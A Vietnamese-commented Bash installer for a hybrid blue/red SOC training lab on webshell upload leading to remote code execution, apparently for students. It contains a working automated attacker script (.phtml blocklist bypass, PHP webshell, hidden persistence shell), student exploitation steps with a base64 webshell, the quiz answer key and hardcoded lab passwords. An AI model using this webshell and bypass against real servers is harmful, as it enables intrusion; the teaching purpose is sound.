#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-webshell (Hybrid: Web Shell Upload -> RCE) tren VM Labtainers.
# Chay tren VM:  bash install-soc-webshell.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-webshell
# (siem da BAKE san anh chung soc-wazuh -> KHONG can apply-shared-siem.sh. Giong Chang 0.
#  Yeu cau: co localhost:5000/soc-wazuh:latest trong registry (chay make-soc-wazuh.sh truoc).)
# (File nay duoc SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-webshell
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap tan cong ngam,
# tach khoi tien trinh khoi tao (setsid + &) de chay lien tuc.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_WS_9x2k__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# =============================================================================
# Attacker TU DONG - tan cong UPLOAD WEBSHELL -> RCE vao he A (172.20.0.10).
# Kill-chain THUC TE: moi vong chay LAI tu dau (recon -> dis -> probe -> bypass
# -> verify -> exploit -> persistence). KHONG hardcode: tu parse form, tu thu
# cac bien the duoi file, chi giu cai server CHAP NHAN va THUC THI duoc.
# -> Khi SV va dung (allowlist / tat PHP o uploads) thi moi upload .phtml bi tu
#    choi hoac khong thuc thi => attacker TU FAIL (khong can if-patched).
# =============================================================================
T="http://172.20.0.10"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
log(){ echo "[$(date +%H:%M:%S)] $*"; }

# Payload webshell: chay lenh qua tham so ?cmd=
SHELL_SRC='<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'

wait_up(){
  for i in $(seq 1 120); do
    curl -s -m 4 -o /dev/null "$T/" 2>/dev/null && return 0
    sleep 3
  done
  return 1
}

# Parse trang chu de tim action + ten field file (fallback upload.php / avatar)
discover(){
  local page action field
  page=$(curl -s -m 6 -A "$UA" "$T/" 2>/dev/null)
  action=$(printf '%s' "$page" | grep -oiE "action=[\"']?[a-z0-9_./-]+" | head -1 | sed -E "s/action=[\"']?//I")
  field=$(printf '%s' "$page" | grep -oiE "type=[\"']?file[\"']?[^>]*name=[\"']?[a-z0-9_]+|name=[\"']?[a-z0-9_]+[\"']?[^>]*type=[\"']?file" \
          | grep -oiE "name=[\"']?[a-z0-9_]+" | head -1 | sed -E "s/name=[\"']?//I")
  [ -z "$action" ] && action="upload.php"
  [ -z "$field" ]  && field="avatar"
  ACTION="$action"; FIELD="$field"
}

# up <fname> <ctype> <localfile> -> in body phan hoi
up(){ curl -s -m 8 -A "$UA" -F "${FIELD}=@${3};type=${2};filename=${1}" "$T/$ACTION" 2>/dev/null; }

# Lay duong dan uploads/<...> tu phan hoi (neu app in ra), else doan theo ten
saved_path(){ printf '%s' "$1" | grep -oE "uploads/[A-Za-z0-9_.-]+" | head -1; }

# Kiem RCE: goi file, truyen marker, xem co chay khong
verify_rce(){ # $1 = path uploads/xxx ; $2 = marker
  curl -s -m 8 -A "$UA" "$T/$1?cmd=echo%20$2" 2>/dev/null | grep -q "$2"
}

attack_once(){
  discover
  log "recon: action=$ACTION field=$FIELD"

  # --- baseline: upload file "anh" hop le de biet noi luu ---
  echo "hello" > /tmp/t.jpg
  R=$(up "avatar.jpg" "image/jpeg" /tmp/t.jpg)
  BP=$(saved_path "$R"); log "baseline jpg -> ${BP:-?}"

  # --- thu .php thang (du bi chan) ---
  printf '%s' "$SHELL_SRC" > /tmp/s.php
  R=$(up "shell.php" "image/jpeg" /tmp/s.php)
  if printf '%s' "$R" | grep -qiE "BLOCK_PHP|tu choi|403"; then log "shell.php -> BI CHAN (nhu mong doi)"; fi

  # --- thu double-ext .php.jpg (thuong upload OK nhung KHONG thuc thi -> loai) ---
  R=$(up "shell.php.jpg" "image/jpeg" /tmp/s.php)
  P=$(saved_path "$R")
  if [ -n "$P" ] && verify_rce "$P" "DXMARK$$"; then
    log "double-ext RCE (hiem)"; RCE_PATH="$P"; return 0
  fi

  # --- bypass chinh: .phtml (va vai bien the) -> upload + verify RCE ---
  local n; n="av_$(date +%s)_$RANDOM"
  for ext in phtml phar pht; do
    R=$(up "${n}.${ext}" "image/jpeg" /tmp/s.php)
    P=$(saved_path "$R")
    [ -z "$P" ] && P="uploads/${n}.${ext}"   # doan neu app khong in path
    if verify_rce "$P" "RCE${RANDOM}OK"; then
      log "BYPASS .$ext THANH CONG -> RCE tai $P"
      RCE_PATH="$P"; return 0
    fi
  done
  log "khong upload duoc webshell thuc thi (co the he A da duoc VA)"
  return 1
}

post_exploit(){
  local M="PWNED_$RANDOM"
  log "post-exploit: $(curl -s -m 8 -A "$UA" "$T/$RCE_PATH?cmd=id;whoami;echo%20$M" 2>/dev/null | tr -d '\n' | tail -c 200)"
  # persistence: ha shell tang 2 ten AN (dotfile) bang chinh webshell (www-data ghi vao uploads)
  local b=".sys_$(date +%s).phtml"
  curl -s -m 8 -A "$UA" --data-urlencode "cmd=printf '%s' '$SHELL_SRC' > /var/www/html/uploads/$b" "$T/$RCE_PATH" >/dev/null 2>&1
  log "persistence: tha $b"
}

log "=== attacker start -> $T ==="
wait_up || { log "target khong len"; }
while true; do
  RCE_PATH=""
  if attack_once && [ -n "$RCE_PATH" ]; then
    post_exploit
  fi
  sleep 120
done
__EOF_WS_9x2k__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_WS_9x2k__'
SOC Lab - Web Shell Upload -> RCE (Hybrid Blue + Red) - web app "PhotoBox" (upload anh).
Blue: he A dang bi tan cong upload webshell: ke tan cong bypass blocklist ngay tho (.php bi chan)
bang duoi .phtml -> thuc thi lenh (RCE). SV dieu tra qua SIEM (FIM + access log), GHI PHIEU 5 cau
(~/dieu-tra.txt: IP, endpoint upload, duoi lach, tham so RCE, thu muc FIM bao), go webshell va
VA GOC ham upload, giu chuc nang tai anh hop le chay dung (SLA).
Red: he B la ban sao chua va, chi HTTP. SV tu khai thac: tim form upload -> .php bi chan -> dung
.phtml upload webshell -> RCE -> doc file flag ca nhan hoa -> nop qua /submit.php tren he B.
__EOF_WS_9x2k__
cat > "$LAB/config/parameter.config" <<'__EOF_WS_9x2k__'
# parameter.config - ca nhan hoa (chong chep bai)
# He B co bi mat ca nhan hoa: WEBSHELLFLAG (lay qua upload webshell .phtml -> RCE -> doc file flag).
# Grading xac minh TREN he B qua /submit.php (B khong co shell cho SV truoc khi RCE).
FLAGVAL : RAND_REPLACE : targetb:.local/bin/fixlocal.sh : FLAGVAL : 100000 : 999999
__EOF_WS_9x2k__
cat > "$LAB/config/start.config" <<'__EOF_WS_9x2k__'
# start.config - Lab soc-webshell (Hybrid: Web Shell Upload -> RCE)
# attacker (C) upload webshell (bypass blocklist .php bang .phtml) -> RCE vao targeta (A) -> SV VA (Blue).
# SV dung chinh ky thuat do PWN targetb (B) qua HTTP: upload webshell -> RCE -> doc flag -> nop /submit.php (Red).

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-webshell_student_master_seed
	GRADE_CONTAINER targeta

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- A: PhotoBox cua sinh vien (upload loi + Wazuh agent). SV phai VA ---
CONTAINER targeta
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	ADD-HOST targetb:172.20.0.40
	TERMINALS 1

# --- B: PhotoBox production (lo hong y het, chua va), CHI HTTP (khong SSH). SV PWN lay flag ---
CONTAINER targetb
	USER ubuntu
	SOC_NET 172.20.0.40
	TERMINALS 0

# --- C: ke tan cong, chay ngam, upload webshell (bypass .phtml) -> RCE vao A ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST targeta:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram sinh vien - Firefox xem dashboard + curl de khai thac B ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST targeta:172.20.0.10
	ADD-HOST targetb:172.20.0.40
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_WS_9x2k__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/fixlocal.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Defender: tram sinh vien. Ghi san cac dia chi muc tieu (khong lo cach khai thac - xem read_first).
cat > /home/ubuntu/muc-tieu.txt <<'TXT'
=== DIA CHI ===
Dashboard SIEM (Wazuh):   https://172.20.0.20
He A (VA tai day):        ssh analyst@172.20.0.10   (mat khau: analyst) ; ma nguon /var/www/html
He B (KHAI THAC lay flag): http://172.20.0.40        (chi HTTP)
Nop flag he B:            http://172.20.0.40/submit.php?flag=FLAG-xxxxxx
TXT
chmod 644 /home/ubuntu/muc-tieu.txt 2>/dev/null || true

# X11/Firefox: KHONG dung vao /tmp/.X11-unix. Labtainers tu lo (mkdir thu muc that + symlink X0 ben trong).
# Neu bien /tmp/.X11-unix thanh symlink ca thu muc -> lenh 'ln -fs .../X0 /tmp/.X11-unix/X0' cua Labtainers
# thay 2 ve la CUNG 1 FILE -> loi "are the same file" -> doX11Link fail -> tear down lab. Giong soc-ssh-defense.

exit 0
__EOF_WS_9x2k__
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_WS_9x2k__'
#!/bin/bash
# Mo Wazuh dashboard trong Firefox tren tram defender.
# LUU Y: file nay duoc SOURCE vao shell dang nhap -> TUYET DOI khong goi 'exit' (tat terminal)
# va khong chay vong lap/sleep o foreground (treo terminal). Toan bo bon vao MOT SUBSHELL NEN ( ) &.
#
# CHONG LOI "firefox khong len / cannot open display": tu tao MOT FILE symlink
# /tmp/.X11-unix/X<n> -> /var/tmp/.X11-unix/X<n> (CHI tao FILE symlink khi THIEU, TUYET DOI
# khong bien ca thu muc /tmp/.X11-unix thanh symlink -> tranh loi doX11Link "same file").
if ! id | grep -q 'uid=0'; then
  (
    export DISPLAY="${DISPLAY:-:0}"
    dn="${DISPLAY#:}"; dn="${dn%%.*}"
    ensure_x11() {
      [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 2>/dev/null
      if [ ! -S "/tmp/.X11-unix/X$dn" ] && [ -S "/var/tmp/.X11-unix/X$dn" ]; then
        ln -sf "/var/tmp/.X11-unix/X$dn" "/tmp/.X11-unix/X$dn" 2>/dev/null
      fi
    }
    for _ in $(seq 1 20); do
      ensure_x11
      [ -S "/tmp/.X11-unix/X$dn" ] && break
      sleep 2
    done
    ensure_x11
    ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
  ) >/dev/null 2>&1 &
fi
__EOF_WS_9x2k__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_WS_9x2k__'
========================================================================
  BAI 7 - WEB SHELL -> RCE: DIEU TRA (FIM) + VA + KHAI THAC (Cong ty X)
========================================================================

Day la bai HYBRID: ban vua lam BLUE (phong thu he A) vua lam RED (tan cong he B).

 * BLUE - he A (172.20.0.10, "PhotoBox" - dich vu tai anh dai dien):
     Mot ke tan cong (an) dang LIEN TUC upload webshell va da RCE duoc. Nhiem vu:
     DIEU TRA qua SIEM (FIM + access.log) -> GHI PHIEU -> VA GOC lo hong upload ->
     DON sach webshell -> GIU dich vu tai anh hop le van chay (SLA).

 * RED - he B (172.20.0.40, ban sao CHUA va, chi HTTP):
     Ban TU khai thac dung chuoi tan cong do -> doc FLAG ca nhan hoa -> NOP qua
     /submit.php de chung minh da hieu lo hong.

Duong ong THAT: attacker -> he A (access.log + FIM) -> agent Wazuh -> dashboard.

!!! LAN DAU: siem can ~8-10' de cai xong Wazuh. Neu dashboard chua vao duoc,
    doi them vai phut (tren siem:  tail -f /var/log/wazuh-install.log).

------------------------------------------------------------------------
0) DIA CHI & HAI VAI
------------------------------------------------------------------------
  (Tren defender da co san file ~/muc-tieu.txt ghi lai cac dia chi nay.)
  - Dashboard SIEM:  https://172.20.0.20
        Dang nhap: admin / Q*uJjovx2guqFRqntC568k?lf3evm.jl
        (mat khau admin CO DINH baked trong anh chung soc-wazuh - giong het Bai 1-3.
         Neu ai TU build lai anh chung bang make-soc-wazuh.sh <pw> thi dung <pw> do.)
  - He A (BLUE - va tai day):   ssh analyst@172.20.0.10     (mat khau: analyst)
        ma nguon web: /var/www/html   (index.php, upload.php, uploads/)
  - He B (RED - khai thac):     http://172.20.0.40          (chi HTTP, khong co shell)
        nop flag: http://172.20.0.40/submit.php?flag=FLAG-xxxxxx

------------------------------------------------------------------------
1) DIEU TRA (BLUE) - GHI PHIEU (tren he A)
------------------------------------------------------------------------
File khung ~/dieu-tra.txt DA CO SAN tren he A (5 dong D1=..D5= de trong).
SSH sang va MO RA DIEN SO:  ssh analyst@172.20.0.10  ->  nano ~/dieu-tra.txt
Tra loi 5 cau, GHI SO sau moi dau '=', moi cau 1 dong dang  Dx=<so>  :

  D1. Octet cuoi IP ke tan cong? (access.log cua he A; dang 172.20.0.X -> ghi X)
  D2. Ke tan cong dung ENDPOINT nao de UPLOAD?
        1 = login.php    2 = upload.php    3 = index.php    4 = submit.php
  D3. .php bi chan. Ke tan cong lach blocklist bang DUOI FILE nao (file that su RCE)?
        1 = .jpg    2 = .php5    3 = .phtml    4 = .png
  D4. File webshell nhan lenh thuc thi qua THAM SO URL nao? (mo chinh file webshell FIM bao)
        1 = file    2 = cmd    3 = id    4 = q
  D5. FIM (syscheck) canh bao file LA duoc THEM vao THU MUC nao?
        1 = /etc    2 = /var/www/html/uploads    3 = /tmp    4 = /home/analyst

  Vi du noi dung ~/dieu-tra.txt :
      D1=5
      D2=2
      D3=3
      D4=2
      D5=2

------------------------------------------------------------------------
2) TIM O DAU (3 cap goi y)
------------------------------------------------------------------------
 Cap 1: Dashboard (Threat Hunting / Discover). Co 2 nguon quan trong:
        - access.log (log_format apache): thay request upload + request goi webshell.
        - FIM/syscheck: thay FILE MOI xuat hien trong thu muc bi giam sat.
 Cap 2:
   D1/D2: Trong access.log loc theo IP ke tan cong. Request upload co dang
          "POST /<endpoint> ...". Tren he A:
            sudo grep -E 'POST|uploads/' /var/log/apache2/access.log | tail
   D3:    Dung tin "duoi nao RCE" chi vi ten. PHAI tuong quan: file nao vua duoc
          UPLOAD (POST) VUA bi GOI lai kem '?cmd=' (GET uploads/<file>?cmd=...).
          Duoi cua file do = dap an.
   D4:    Mo chinh file webshell FIM bao (trong uploads/) va doc ma PHP:
            sudo cat /var/www/html/uploads/<webshell>
          Tim ten tham so trong $_REQUEST[...] hoac $_GET[...] -> do la tham so RCE.
   D5:    Tren dashboard, cac canh bao FIM ('syscheck'/'File added') chi ra duong
          dan file moi -> thu muc chua chung.
 Cap 3 (dap an huong dan):
   D1=5. D2=2 (upload.php). D3=3 (.phtml). D4=2 (cmd). D5=2 (/var/www/html/uploads).

------------------------------------------------------------------------
3) UNG PHO (BLUE) - VA GOC + DON SACH (tren he A, qua ssh analyst@172.20.0.10)
------------------------------------------------------------------------
  Ke tan cong cai lai webshell dinh ky. CAN va goc, dong thoi don sach:

  a. VA GOC ham upload (sua /var/www/html/upload.php - analyst so huu, khong can sudo):
       - Dung ALLOWLIST duoi anh (chi cho .jpg/.jpeg/.png/.gif) THAY VI blocklist, VA
       - kiem noi dung that su la anh (getimagesize()).
     HOAC chan thuc thi PHP trong uploads/ bang .htaccess:
       cat > /var/www/html/uploads/.htaccess <<'EOF'
       php_flag engine off
       RemoveHandler .php .phtml .phar .pht
       EOF
  b. DON sach webshell con sot (ke ca file AN dang .phtml):
       ls -la /var/www/html/uploads/
       rm -f /var/www/html/uploads/<cac file .php .phtml .phar .pht>
  c. GIU SLA: dich vu phai con tai duoc ANH HOP LE (.jpg). Dung va qua tay.

  (prestop se tu test: upload .jpg hop le -> phai OK ; upload .phtml test -> phai
   KHONG con thuc thi ; va kiem uploads/ con webshell khong.)

------------------------------------------------------------------------
4) KHAI THAC (RED) - LAY FLAG HE B (http://172.20.0.40)
------------------------------------------------------------------------
  He B la ban sao CHUA va. Tu tay di lai chuoi tan cong:
    1. Mo http://172.20.0.40/ -> tim form upload (field 'avatar', action upload.php).
    2. Thu .php -> bi chan. Lach bang .phtml. Tao mot webshell PHP TOI THIEU (mot the
       PHP goi ham he thong tren tham so URL ten 'cmd'). De antivirus tren may that
       khoi chan, chuoi payload duoi day duoc de DUOI DANG BASE64 - giai ma ra file:
         echo 'PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==' | base64 -d > shell.phtml
       Upload:
         curl -F "avatar=@shell.phtml;type=image/jpeg;filename=shell.phtml" http://172.20.0.40/upload.php
       -> phan hoi in duong dan uploads/shell.phtml.
    3. RCE + doc flag (tham so 'cmd'):
         curl "http://172.20.0.40/uploads/shell.phtml?cmd=cat%20/var/lib/photobox/flag.txt"
       -> ra 'FLAG-<so>' (MOI SV MOT SO KHAC NHAU).
    4. NOP flag:
         curl "http://172.20.0.40/submit.php?flag=FLAG-<so>"

------------------------------------------------------------------------
5) NOP BAI
------------------------------------------------------------------------
  checkwork  -> can dat CA 3:
     * webshell_dieutra = Y  (dieu tra Blue dung >= 4/5 cau)
     * blue_patched     = Y  (he A HET RCE + sach webshell + con SLA)
     * red_flag         = Y  (lay duoc flag he B)
  Xong: stoplab
__EOF_WS_9x2k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.attacker.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - attacker (upload webshell -> RCE vao he A, tu dong, an)
#
ARG registry
# Base network co curl-able; them curl de tan cong HTTP thich nghi
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# curl: dung de recon + upload (multipart) + goi webshell
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.defender.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7) ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# ssh-client (SSH sang targeta va) + curl + python3 (dung de khai thac he B, C2 neu can)
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client curl python3 \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.siem.student" <<'__EOF_WS_9x2k__'
#
# siem - dung image nen soc-wazuh (Wazuh cai san). Entrypoint khoi phuc quyen Wazuh truoc init.
# (Da BAKE san anh chung vao nguon - KHONG can chay apply-shared-siem.sh nua. Giong Chang 0.)
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem detection)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Entrypoint: khoi phuc quyen cac user Wazuh (bi reset ve root khi layer image chung).
#     Chay o PID 1 TRUOC systemd -> OpenSearch chua chay -> chown /var/lib an toan (khong hong node.lock),
#     roi exec /sbin/init -> systemd khoi dong day du indexer + manager + dashboard + filebeat. ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  '# Khoi phuc quyen cac user Wazuh truoc khi systemd start cac service.' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  '# filebeat + wazuh-manager chay root -> khong can chown' \
  '# Don trang thai agent cu tu anh nen (counter rids + client.keys) -> agent enroll lai sach,' \
  '# tranh loi "counter mismatch" lam agent Disconnected khi dung image chung.' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
# Ghi DUNG ten lab cho siem: anh nen soc-wazuh mang san .labname cua lab goc (soc-ssh-defense).
# Neu khong ghi de, zip artifact cua siem bi dat ten theo lab SAI -> grader lech firstlevelzip
# -> loi "Error occurred within the grader container" khi checkwork.
RUN mkdir -p /home/$user_name/.local && echo "soc-webshell" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
CMD ["/entrypoint.sh"]
__EOF_WS_9x2k__
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.targeta.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - targeta (he A: PhotoBox PHP upload loi + Wazuh agent, SV va)
#
ARG registry
# Base co openssh-server (sshd) + rsyslog -> analyst SSH sang de va
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack: apache + php (mod-php xu ly .php VA .phtml mac dinh) + curl (cho prestop)
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 curl \
    ) ; rm -rf /var/lib/apt/lists/*
#
# Wazuh agent (bake, tro ve manager 172.20.0.20)
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
cat > "$LAB/dockerfiles/Dockerfile.soc-webshell.targetb.student" <<'__EOF_WS_9x2k__'
#
# Labtainer Dockerfile - targetb (he B: PhotoBox PHP upload loi, chi HTTP, SV pwn lay flag)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Web stack (khong Wazuh, khong SSH)
RUN DEBIAN_FRONTEND=noninteractive apt-get update && ( \
      apt-get install -y --no-install-recommends apache2 php libapache2-mod-php curl \
      || apt-get install -y --no-install-recommends apache2 libapache2-mod-php7.0 curl \
    ) ; rm -rf /var/lib/apt/lists/*
RUN systemctl enable apache2 2>/dev/null || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_WS_9x2k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_WS_9x2k__'
# goals.config - Hybrid Web Shell Upload -> RCE (PhotoBox)
# Chi cham VIEC SINH VIEN LAM (bo detection/agent auto-Y). prestop in tho.

# ===== DIEU TRA (Blue) - phieu ~/dieu-tra.txt tren he A =====
# D1=octet IP ke tan cong(5) ; D2=endpoint upload (upload.php=2) ;
# D3=duoi file lach blocklist (.phtml=3) ; D4=tham so RCE cua webshell (cmd=2) ;
# D5=thu muc FIM bao file la (/var/www/html/uploads=2).
d1 = matchany : integer_equal : _d1 : answer=5
d2 = matchany : integer_equal : _d2 : answer=2
d3 = matchany : integer_equal : _d3 : answer=3
d4 = matchany : integer_equal : _d4 : answer=2
d5 = matchany : integer_equal : _d5 : answer=2
